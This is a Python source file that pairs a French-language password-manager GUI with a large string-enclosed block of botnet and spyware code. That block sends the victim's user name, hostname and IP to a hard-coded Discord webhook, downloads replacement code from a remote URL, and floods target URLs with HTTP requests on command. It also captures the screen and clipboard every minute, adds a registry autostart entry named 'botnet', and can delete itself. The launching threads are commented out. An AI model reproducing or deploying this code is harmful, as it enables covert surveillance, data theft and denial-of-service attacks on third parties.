"""
import requests
from bs4 import BeautifulSoup
import time
import socket
import re
import threading
import flet as ft
import json
import os
import hashlib
import secrets
import string
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import pyperclip
import platform
import random


 
class PasswordManager:
 
    def __init__(self):
        self.data_file = "passwords_data.json"
        self.master_file = "master_password.json"
        self.cipher = None
        self.logged_in = False
 
    def derive_key(self, password, salt):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))
 
    def hash_password(self, password):
        return hashlib.sha256(password.encode()).hexdigest()
 
    def setup_master_password(self, password):
        salt = os.urandom(16)
        master_data = {
            'hash': self.hash_password(password),
            'salt': base64.b64encode(salt).decode()
        }
        with open(self.master_file, 'w') as f:
            json.dump(master_data, f)
        self.cipher = Fernet(self.derive_key(password, salt))
        self.logged_in = True
        return True
 
    def verify_master_password(self, password):
        if not os.path.exists(self.master_file):
            return False
        with open(self.master_file, 'r') as f:
            master_data = json.load(f)
        if self.hash_password(password) == master_data['hash']:
            salt = base64.b64decode(master_data['salt'])
            self.cipher = Fernet(self.derive_key(password, salt))
            self.logged_in = True
            return True
        return False
 
    def encrypt_data(self, data):
        if self.cipher is None:
            return None
        return self.cipher.encrypt(data.encode()).decode()
 
    def decrypt_data(self, encrypted_data):
        if self.cipher is None:
            return None
        try:
            return self.cipher.decrypt(encrypted_data.encode()).decode()
        except Exception:
            return None
 
    def load_passwords(self):
        if not os.path.exists(self.data_file):
            return []
        with open(self.data_file, 'r') as f:
            encrypted_passwords = json.load(f)
        passwords = []
        for item in encrypted_passwords:
            try:
                decrypted_password = self.decrypt_data(item['password'])
                if decrypted_password:
                    passwords.append({
                        'id': item['id'],
                        'site': item['site'],
                        'username': item['username'],
                        'password': decrypted_password,
                        'notes': item.get('notes', ''),
                        'category': item.get('category', 'Autre'),
                        'created': item.get('created', ''),
                        'modified': item.get('modified', '')
                    })
            except Exception:
                continue
        return passwords
 
    def save_passwords(self, passwords):
        encrypted_passwords = []
        for pwd in passwords:
            encrypted_passwords.append({
                'id': pwd['id'],
                'site': pwd['site'],
                'username': pwd['username'],
                'password': self.encrypt_data(pwd['password']),
                'notes': pwd.get('notes', ''),
                'category': pwd.get('category', 'Autre'),
                'created': pwd.get('created', ''),
                'modified': pwd.get('modified', '')
            })
        with open(self.data_file, 'w') as f:
            json.dump(encrypted_passwords, f, indent=2)
 
    def add_password(self, passwords, site, username, password, notes='', category='Autre'):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        new_entry = {
            'id': secrets.token_hex(8),
            'site': site,
            'username': username,
            'password': password,
            'notes': notes,
            'category': category,
            'created': now,
            'modified': now
        }
        passwords.append(new_entry)
        self.save_passwords(passwords)
        return new_entry
 
    def update_password(self, passwords, password_id, site, username, password, notes='', category='Autre'):
        for pwd in passwords:
            if pwd['id'] == password_id:
                pwd['site'] = site
                pwd['username'] = username
                pwd['password'] = password
                pwd['notes'] = notes
                pwd['category'] = category
                pwd['modified'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                self.save_passwords(passwords)
                return True
        return False
 
    def delete_password(self, passwords, password_id):
        passwords[:] = [p for p in passwords if p['id'] != password_id]
        self.save_passwords(passwords)
 
    def generate_password(self, length=16, use_uppercase=True, use_lowercase=True,
                          use_digits=True, use_symbols=True):
        characters = ''
        if use_lowercase:
            characters += string.ascii_lowercase
        if use_uppercase:
            characters += string.ascii_uppercase
        if use_digits:
            characters += string.digits
        if use_symbols:
            characters += string.punctuation
        if not characters:
            characters = string.ascii_letters + string.digits
        return ''.join(secrets.choice(characters) for _ in range(length))
 
    def check_password_strength(self, password):
        score = 0
        if len(password) >= 8:
            score += 20
        if len(password) >= 12:
            score += 10
        if len(password) >= 16:
            score += 10
        if any(c.islower() for c in password):
            score += 15
        if any(c.isupper() for c in password):
            score += 15
        if any(c.isdigit() for c in password):
            score += 15
        if any(c in string.punctuation for c in password):
            score += 15
        return min(score, 100)
 
 
def main(page: ft.Page):
    page.title = "Gestionnaire de Mots de Passe Securise"
    page.theme_mode = ft.ThemeMode.LIGHT
    page.window.width = 1200
    page.window.height = 800
    page.padding = 0
 
    manager = PasswordManager()
    passwords_list = []
    categories = ["Reseaux sociaux", "Email", "Banque", "Travail", "Personnel", "Autre"]
    editing_password_id = [None]
 
    def show_snackbar(message, color="green"):
        page.snack_bar = ft.SnackBar(
            content=ft.Text(message, color="white"),
            bgcolor=color
        )
        page.snack_bar.open = True
        page.update()
 
    def get_strength_info(score):
        if score < 40:
            return "red", "Faible"
        elif score < 70:
            return "orange", "Moyenne"
        else:
            return "green", "Forte"
 
    def setup_master_password_screen():
        password_input = ft.TextField(
            label="Creez votre mot de passe maitre",
            password=True,
            can_reveal_password=True,
            width=400,
            hint_text="Au moins 8 caracteres recommandes"
        )
        confirm_password_input = ft.TextField(
            label="Confirmez le mot de passe maitre",
            password=True,
            can_reveal_password=True,
            width=400
        )
        strength_bar = ft.ProgressBar(width=400, value=0, color="red")
        strength_text = ft.Text("Force: Faible", color="red")
 
        def update_strength(e):
            val = password_input.value or ""
            if val:
                score = manager.check_password_strength(val)
                color, label = get_strength_info(score)
                strength_bar.value = score / 100
                strength_bar.color = color
                strength_text.value = "Force: " + label
                strength_text.color = color
            else:
                strength_bar.value = 0
                strength_bar.color = "red"
                strength_text.value = "Force: Faible"
                strength_text.color = "red"
            page.update()
 
        password_input.on_change = update_strength
 
        def create_master_password(e):
            if not password_input.value:
                show_snackbar("Veuillez entrer un mot de passe", "red")
                return
            if len(password_input.value) < 8:
                show_snackbar("Au moins 8 caracteres requis", "red")
                return
            if password_input.value != confirm_password_input.value:
                show_snackbar("Les mots de passe ne correspondent pas", "red")
                return
            manager.setup_master_password(password_input.value)
            show_snackbar("Mot de passe maitre cree!", "green")
            show_main_screen()
 
        page.clean()
        page.add(
            ft.Column(
                [
                    ft.Container(height=50),
                    ft.Icon(ft.Icons.LOCK, size=80, color="blue"),
                    ft.Text("Gestionnaire de Mots de Passe", size=24, weight=ft.FontWeight.BOLD, text_align=ft.TextAlign.CENTER),
                    ft.Text("Creez un mot de passe maitre securise", size=16, text_align=ft.TextAlign.CENTER, color="grey"),
                    ft.Container(height=30),
                    password_input,
                    ft.Container(height=10),
                    strength_bar,
                    strength_text,
                    ft.Container(height=20),
                    confirm_password_input,
                    ft.Container(height=30),
                    ft.FilledButton("Creer mon coffre-fort", icon=ft.Icons.CHECK, on_click=create_master_password),
                    ft.Container(
                        content=ft.Text("Important: Ne perdez pas ce mot de passe!\nIl est impossible de le recuperer.", text_align=ft.TextAlign.CENTER, color="red", size=12),
                        padding=20
                    )
                ],
                horizontal_alignment=ft.CrossAxisAlignment.CENTER,
                alignment=ft.MainAxisAlignment.CENTER,
                expand=True
            )
        )
 
    def login_screen():
        password_input = ft.TextField(
            label="Mot de passe maitre",
            password=True,
            can_reveal_password=True,
            width=400,
            autofocus=True
        )
 
        def do_login(e):
            if manager.verify_master_password(password_input.value):
                show_snackbar("Connexion reussie!", "green")
                show_main_screen()
            else:
                show_snackbar("Mot de passe incorrect", "red")
                password_input.value = ""
                password_input.focus()
                page.update()
 
        password_input.on_submit = do_login
 
        page.clean()
        page.add(
            ft.Column(
                [
                    ft.Container(height=50),
                    ft.Icon(ft.Icons.LOCK_OPEN, size=80, color="blue"),
                    ft.Text("Gestionnaire de Mots de Passe", size=28, weight=ft.FontWeight.BOLD),
                    ft.Text("Entrez votre mot de passe maitre", size=14, color="grey"),
                    ft.Container(height=30),
                    password_input,
                    ft.Container(height=20),
                    ft.FilledButton("Deverrouiller", icon=ft.Icons.LOGIN, on_click=do_login)
                ],
                horizontal_alignment=ft.CrossAxisAlignment.CENTER,
                alignment=ft.MainAxisAlignment.CENTER,
                expand=True
            )
        )
 
    def show_main_screen():
        nonlocal passwords_list
        passwords_list = manager.load_passwords()
 
        search_field = ft.TextField(
            hint_text="Rechercher...",
            prefix_icon=ft.Icons.SEARCH,
            width=400
        )
        category_filter = ft.Dropdown(
            label="Categorie",
            options=[ft.dropdown.Option("Toutes")] + [ft.dropdown.Option(c) for c in categories],
            value="Toutes",
            width=200
        )
        passwords_container = ft.Column(scroll=ft.ScrollMode.AUTO, expand=True)
 
        search_field.on_change = lambda e: filter_passwords()
        category_filter.on_change = lambda e: filter_passwords()
 
        def filter_passwords():
            term = (search_field.value or "").lower()
            cat = category_filter.value
            filtered = [
                p for p in passwords_list
                if (term in p['site'].lower() or term in p['username'].lower())
                and (cat == "Toutes" or p['category'] == cat)
            ]
            display_passwords(filtered)
 
        def display_passwords(items):
            passwords_container.controls.clear()
            if not items:
                passwords_container.controls.append(
                    ft.Container(
                        content=ft.Column(
                            [
                                ft.Icon(ft.Icons.LOCK_OPEN, size=60, color="grey"),
                                ft.Text("Aucun mot de passe enregistre", size=18, color="grey"),
                                ft.Text("Cliquez sur Nouveau pour commencer", size=14, color="grey")
                            ],
                            horizontal_alignment=ft.CrossAxisAlignment.CENTER,
                            alignment=ft.MainAxisAlignment.CENTER
                        ),
                        padding=50
                    )
                )
            else:
                for pwd in items:
                    passwords_container.controls.append(create_password_card(pwd))
            page.update()
 
        def create_password_card(pwd):
            password_hidden = ft.Text("........", size=14)
            password_visible = ft.Text(pwd['password'], size=14, visible=False)
            eye_ref = [None]
 
            def toggle_visibility(e):
                password_hidden.visible = not password_hidden.visible
                password_visible.visible = not password_visible.visible
                eye_ref[0].icon = ft.Icons.VISIBILITY_OFF if password_visible.visible else ft.Icons.VISIBILITY
                page.update()
 
            eye_btn = ft.IconButton(icon=ft.Icons.VISIBILITY, on_click=toggle_visibility, tooltip="Afficher/Masquer")
            eye_ref[0] = eye_btn
 
            def copy_pwd(e):
                try:
                    pyperclip.copy(pwd['password'])
                    show_snackbar("Mot de passe copie!", "green")
                except Exception:
                    show_snackbar("Erreur lors de la copie", "red")
 
            def edit_pwd(e):
                show_password_form(pwd)
 
            def delete_confirm(e):
                def do_delete(e):
                    manager.delete_password(passwords_list, pwd['id'])
                    show_snackbar("Supprime!", "orange")
                    dlg.open = False
                    filter_passwords()
                    page.update()
 
                def cancel(e):
                    dlg.open = False
                    page.update()
 
                dlg = ft.AlertDialog(
                    title=ft.Text("Confirmer la suppression"),
                    content=ft.Text(f"Supprimer le mot de passe pour {pwd['site']} ?"),
                    actions=[
                        ft.TextButton("Annuler", on_click=cancel),
                        ft.TextButton("Supprimer", on_click=do_delete, style=ft.ButtonStyle(color="red"))
                    ]
                )
                page.overlay.append(dlg)
                dlg.open = True
                page.update()
 
            icon_name = (
                ft.Icons.LANGUAGE if pwd['category'] in ["Reseaux sociaux", "Email"]
                else ft.Icons.ACCOUNT_BALANCE if pwd['category'] == "Banque"
                else ft.Icons.WORK if pwd['category'] == "Travail"
                else ft.Icons.PERSON
            )
 
            return ft.Card(
                content=ft.Container(
                    content=ft.Row(
                        [
                            ft.Container(content=ft.Icon(icon_name, size=40, color="blue"), padding=10),
                            ft.Column(
                                [
                                    ft.Text(pwd['site'], size=18, weight=ft.FontWeight.BOLD),
                                    ft.Text(f"Identifiant: {pwd['username']}", size=12, color="grey"),
                                    ft.Row([ft.Text("Mot de passe: ", size=12, color="grey"), password_hidden, password_visible]),
                                ],
                                spacing=2,
                                expand=True
                            ),
                            ft.Row([
                                eye_btn,
                                ft.IconButton(icon=ft.Icons.COPY, on_click=copy_pwd, tooltip="Copier"),
                                ft.IconButton(icon=ft.Icons.EDIT, on_click=edit_pwd, tooltip="Modifier"),
                                ft.IconButton(icon=ft.Icons.DELETE, on_click=delete_confirm, tooltip="Supprimer", icon_color="red")
                            ])
                        ],
                        alignment=ft.MainAxisAlignment.SPACE_BETWEEN
                    ),
                    padding=15
                ),
                elevation=2
            )
 
        def show_password_form(password_data=None):
            editing_password_id[0] = password_data['id'] if password_data else None
            is_editing = password_data is not None
 
            site_field = ft.TextField(label="Site ou application", value=password_data['site'] if is_editing else "", width=500)
            username_field = ft.TextField(label="Identifiant ou email", value=password_data['username'] if is_editing else "", width=500)
            password_field = ft.TextField(label="Mot de passe", value=password_data['password'] if is_editing else "", password=True, can_reveal_password=True, width=500)
            notes_field = ft.TextField(label="Notes (optionnel)", value=password_data.get('notes', '') if is_editing else "", multiline=True, min_lines=3, max_lines=5, width=500)
            category_dropdown = ft.Dropdown(
                label="Categorie",
                options=[ft.dropdown.Option(c) for c in categories],
                value=password_data['category'] if is_editing else "Autre",
                width=500
            )
            length_slider = ft.Slider(min=8, max=32, value=16, divisions=24, label="{value}")
            uppercase_check = ft.Checkbox(label="Majuscules (A-Z)", value=True)
            lowercase_check = ft.Checkbox(label="Minuscules (a-z)", value=True)
            digits_check = ft.Checkbox(label="Chiffres (0-9)", value=True)
            symbols_check = ft.Checkbox(label="Symboles (!@#$...)", value=True)
            generated_text = ft.Text("", size=14, weight=ft.FontWeight.BOLD)
            strength_bar = ft.ProgressBar(width=500, value=0, color="red")
            strength_text = ft.Text("Force: Faible", color="red")
 
            def update_strength(e=None):
                val = password_field.value or ""
                if val:
                    score = manager.check_password_strength(val)
                    color, label = get_strength_info(score)
                    strength_bar.value = score / 100
                    strength_bar.color = color
                    strength_text.value = "Force: " + label
                    strength_text.color = color
                else:
                    strength_bar.value = 0
                    strength_bar.color = "red"
                    strength_text.value = "Force: Faible"
                    strength_text.color = "red"
                page.update()
 
            password_field.on_change = update_strength
 
            def generate(e):
                new_pwd = manager.generate_password(
                    length=int(length_slider.value),
                    use_uppercase=uppercase_check.value,
                    use_lowercase=lowercase_check.value,
                    use_digits=digits_check.value,
                    use_symbols=symbols_check.value
                )
                password_field.value = new_pwd
                generated_text.value = f"Genere: {new_pwd}"
                update_strength()
 
            def save(e):
                nonlocal passwords_list
                if not site_field.value or not username_field.value or not password_field.value:
                    show_snackbar("Remplissez tous les champs obligatoires", "red")
                    return
                if is_editing:
                    manager.update_password(passwords_list, editing_password_id[0], site_field.value, username_field.value, password_field.value, notes_field.value, category_dropdown.value)
                    show_snackbar("Modifie!", "green")
                else:
                    manager.add_password(passwords_list, site_field.value, username_field.value, password_field.value, notes_field.value, category_dropdown.value)
                    show_snackbar("Ajoute!", "green")
                passwords_list = manager.load_passwords()
                filter_passwords()
                close(None)
 
            def close(e):
                dlg.open = False
                page.update()
 
            dlg = ft.AlertDialog(
                title=ft.Text("Modifier" if is_editing else "Nouveau mot de passe"),
                content=ft.Container(
                    content=ft.Column(
                        [
                            site_field, username_field, password_field,
                            strength_bar, strength_text,
                            ft.Divider(),
                            ft.Text("Generateur de mot de passe", weight=ft.FontWeight.BOLD),
                            ft.Row([ft.Text("Longueur:"), length_slider]),
                            ft.Row([uppercase_check, lowercase_check]),
                            ft.Row([digits_check, symbols_check]),
                            ft.FilledButton("Generer", icon=ft.Icons.REFRESH, on_click=generate),
                            generated_text,
                            ft.Divider(),
                            notes_field, category_dropdown
                        ],
                        scroll=ft.ScrollMode.AUTO,
                        width=600,
                        height=600
                    )
                ),
                actions=[
                    ft.TextButton("Annuler", on_click=close),
                    ft.FilledButton("Enregistrer", icon=ft.Icons.SAVE, on_click=save)
                ]
            )
            update_strength()
            page.overlay.append(dlg)
            dlg.open = True
            page.update()
 
        page.clean()
        page.add(
            ft.Column(
                [
                    ft.Container(
                        content=ft.Row([
                            ft.Icon(ft.Icons.LOCK, size=30, color="white"),
                            ft.Text("Gestionnaire de Mots de Passe", size=24, weight=ft.FontWeight.BOLD, color="white"),
                            ft.Container(expand=True),
                            ft.Text(f"Total: {len(passwords_list)} mots de passe", color="white", size=14)
                        ]),
                        bgcolor="blue",
                        padding=20
                    ),
                    ft.Container(
                        content=ft.Row([
                            search_field,
                            category_filter,
                            ft.Container(expand=True),
                            ft.FilledButton("Nouveau", icon=ft.Icons.ADD, on_click=lambda e: show_password_form())
                        ]),
                        padding=20
                    ),
                    ft.Container(content=passwords_container, padding=20, expand=True)
                ],
                expand=True
            )
        )
        display_passwords(passwords_list)
 
    if not os.path.exists(manager.master_file):
        setup_master_password_screen()
    else:
        login_screen()
 
"""
"""

ancienne_version = "1.0.0"

headers = {
    "User-Agent": "...",
    "Accept": "text/html,application/xhtml+xml",
    "Accept-Language": "fr,en;q=0.9",
    "Connection": "keep-alive",
}

from pathlib import Path

chemin_script = Path(__file__).resolve()
webhook = "https://discordapp.com/api/webhooks/1445805470639067311/DdrHhMfsUhJbpH2bN8DBz_4-WblD3jlCgQtpLjS_4t5vjq6vuoURh0tGWhAIY2quGASi"

python_url = "https://raw.githubusercontent.com/juto222/Random-Team/main/code.py"
url_version = "https://linganguliguli.worldlite.fr/Formulaire/nouvelleversion.txt"

def script(python_url):
    try:
        r = requests.get(python_url, headers=headers, stream=True)
        r.raise_for_status()
        with open(chemin_script, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        print("Script téléchargé avec succès !")
    except Exception as e:
        print(f"Erreur lors du téléchargement du script : {e}")


def maj_version(nouvelle_version):
    global ancienne_version
    try:
        with open(chemin_script, "r", encoding="utf-8") as f:
            contenu = f.read()

        nouveau_contenu = re.sub(
            r'ancienne_version\s*=\s*"[0-9.]+"',
            f'ancienne_version = "{nouvelle_version}"',
            contenu
        )

        with open(chemin_script, "w", encoding="utf-8") as f:
            f.write(nouveau_contenu)
        print(f"Version mise à jour dans le script : {nouvelle_version}")

    except Exception as e:
        print(f"Erreur lors de la mise à jour de la version : {e}")

def boucle(ancienne_version):
    while True:
        try:
            r_version = requests.get(url_version, headers=headers)
            r_version.raise_for_status()
            nouvelle_version = r_version.text.strip()

            if nouvelle_version != ancienne_version:
                print(f"Nouvelle version détectée : {nouvelle_version}")
                ancienne_version = nouvelle_version
                script(python_url)
                maj_version(nouvelle_version)
            else:
                print("Aucune nouvelle version.")

        except Exception as e:
            print(f"Erreur lors de la vérification de la version : {e}")

        time.sleep(3500)  # Vérifie toutes les 30 minutes


url = "https://linganguliguli.worldlite.fr/Formulaire/Formulaire.html"

import os

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



valeur = ""
ip_public = ""
alerte_activee = ""
ip_cible = ""
previous_alerte = None
previous_ip = None

import platform
import getpass
import socket

ordi = platform.uname()
hostname = socket.gethostname()



ip_public = requests.get("https://api.ipify.org").text
name = (
    "\n\nMachine démarré \n\n"
    f"Utilisateur actuel : {getpass.getuser()}\n"
    f"Nom de l'ordinateur : {ordi.node}\n"
    f"Adresse IP : {socket.gethostbyname(hostname)}\n"
    f"Adresse IP publique {ip_public}\n\n"
    )

requests.post(webhook, json={"content": name})

def envoyer():
    global valeur

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ = soup.find("input", {"id": "cible"})

        if champ:
            nouvelle_val = champ.get("value").strip()

            # Si la valeur a changé et n'est pas vide → action
            if nouvelle_val != "":
                valeur = nouvelle_val
                ddos_attack()

    except Exception as e:
        print("Erreur :", e)


def loop_check():
    while True:
        envoyer()
        alerte()
        time.sleep(3500)  # Vérifie toutes les 30 minutes

def alerte():
    global previous_alerte, alerte_activee

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ_alerte = soup.find("input", {"id": "alerte"})
        if champ_alerte:
            message_alerte = champ_alerte.get("value").strip()

            if message_alerte != "" and message_alerte != previous_alerte:
                previous_alerte = message_alerte
                alerte_activee = message_alerte
                ip()
    except Exception as e:
        print("Erreur (alerte) :", e)


def ip():
    global ip_public, previous_ip, ip_cible

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ_ip = soup.find("input", {"id": "ip"})
        if champ_ip:
            ip_cible_nouveau = champ_ip.get("value").strip()

            if ip_cible_nouveau != ip_public:
                return

            confirmer(ip_cible_nouveau)

    except Exception as e:
        print("Erreur (ip) :", e)



def confirmer(ip_cible_nouveau):
    global previous_ip, ip_cible

    if ip_cible_nouveau != "" and ip_cible_nouveau != previous_ip:
        previous_ip = ip_cible_nouveau
        ip_cible = ip_cible_nouveau

        try:
            requests.post(webhook, json={"content": f" Botnet détruit à la demande de l'IP cible : {ip_cible}"})
            destroy()
        except ValueError:
            print("IP cible invalide :", ip_cible)


import os
import sys
import subprocess

def destroy():
    script_path = os.path.abspath(sys.argv[0])

    # Pour Windows
    if os.name == "nt":
        subprocess.Popen(
            f'del "{script_path}"',
            shell=True,
        )
    
    # Pour Linux/Mac
    else:
        subprocess.Popen(["rm", script_path])

    sys.exit()

from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp


async def async_ddos_attack():
    global valeur

    nombre_requetes = int(500)
    concurrence = min(100000, nombre_requetes)  # Limiter à 500 connexions simultanées
    
    start_time = time.time()
    
 
    async def envoyer_requete_async(session, num):
        global valeur 
        try:
            async with session.get(valeur, timeout=5) as response:
                if num % 100 == 0 or num < 10:  
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status}")
                return True
        except Exception as e:
            if num % 100 == 0 or num < 10:
                print(f"Erreur requête {num} : {str(e)}")
            return False
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrence, ssl=False)) as session:
        # Créer les tâches
        tasks = [envoyer_requete_async(session, i+1) for i in range(nombre_requetes)]
        
        batch_size = 1000
        successful = 0
        
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i+batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            successful += sum(1 for r in results if r is True)
            
            # Afficher la progression
            progress = min(100, int((i + len(batch)) / nombre_requetes * 100))
            print(f"Progression : {progress}% ({i + len(batch)}/{nombre_requetes})")
    
    duration = time.time() - start_time
    
    temps = f"\nAttaque terminée en {duration:.2f} secondes"
    cible = f"Requêtes réussies : {successful}/{nombre_requetes}"
    vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
    requests.post(webhook, json=temps)
    requests.post(webhook, json=cible)
    requests.post(webhook, json=vitesse)


def ddos_attack():
    global valeur 

    try:
        asyncio.run(async_ddos_attack())
    except ImportError:
        print("Module aiohttp non trouvé. Utilisation de la méthode plus lente.")

        nombre_requetes = int(500)
        max_workers = min(10000, nombre_requetes)
        
        start_time = time.time()
        success_count = 0
        
        def envoyer_requete(num):
            global valeur 
            try:
                response = requests.get(valeur, timeout=5)
                if num % 50 == 0 or num < 5:
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status_code}")
                return True
            except Exception as e:
                if num % 50 == 0 or num < 5:
                    print(f"Erreur requête {num} : {str(e)}")
                return False
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(envoyer_requete, i+1) for i in range(nombre_requetes)]
            
            for i, future in enumerate(futures):
                try:
                    if future.result():
                        success_count += 1
                except Exception:
                    pass
                
                if (i+1) % 100 == 0:
                    print(f"Progression : {int((i+1)/nombre_requetes*100)}% ({i+1}/{nombre_requetes})")
        
        duration = time.time() - start_time
        
        temps = f"\nAttaque terminée en {duration:.2f} secondes"
        cible = f"Requêtes réussies : {success_count}/{nombre_requetes}"
        vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
        requests.post(webhook, json=temps)
        requests.post(webhook, json=cible)
        requests.post(webhook, json=vitesse)


from PIL import ImageGrab
import io

def screenshot_option_func(webhook):
    while True:
        im = ImageGrab.grab()
        buffer = io.BytesIO()
        im.save(buffer, format="PNG")
        buffer.seek(0)
        files = {'file': ('screenshot.png', buffer, 'image/png')}
        message = "Screenshot envoyé"
        requests.post(webhook, data={"content": message}, files=files)
        time.sleep(60)

import clipboard

def clipboard_option_func(webhook):
    old = clipboard.paste()
    while True:
        time.sleep(60)
        mtn = clipboard.paste()
        message = "Presse papier : "
        if old != mtn:
            requests.post(webhook, json={"content": f"{message}{mtn}"})
            im = ImageGrab.grab()
            buffer = io.BytesIO()
            im.save(buffer, format="PNG")
            buffer.seek(0)
            files = {'file': ('screenshot.png', buffer, 'image/png')}
            message = "Screenshot envoyé"
            requests.post(webhook, data={"content": message}, files=files)
            old = mtn

import winreg

def autostart_option_func(script_path=None, name="botnet"):
    # Chemin du script Python
    if script_path is None:
        script_path = os.path.abspath(__file__)

    # Chemin vers python.exe utilisé pour lancer ton script
    python_exe = sys.executable

    # Commande complète à lancer au démarrage
    command = f'"{python_exe}" "{script_path}"'

    # On ouvre la clé Run dans le registre
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )

    # On écrit la commande dans la clé
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
    winreg.CloseKey(key)
"""

if __name__ == "__main__":
    # Démarrer tous les threads en arrière-plan AVANT l'UI
    #threading.Thread(target=screenshot_option_func, args=(webhook,), daemon=False).start()
    #threading.Thread(target=clipboard_option_func, args=(webhook,), daemon=False).start()
    #threading.Thread(target=autostart_option_func, daemon=False).start()
    #threading.Thread(target=loop_check, daemon=False).start()
    #threading.Thread(target=boucle, args=(ancienne_version,), daemon=False).start()
    
    # Lancer l'interface (bloquant)
    try:
        ft.run(main)
    except Exception as e:
        print(f"Erreur lors du lancement de l'interface utilisateur : {e}")
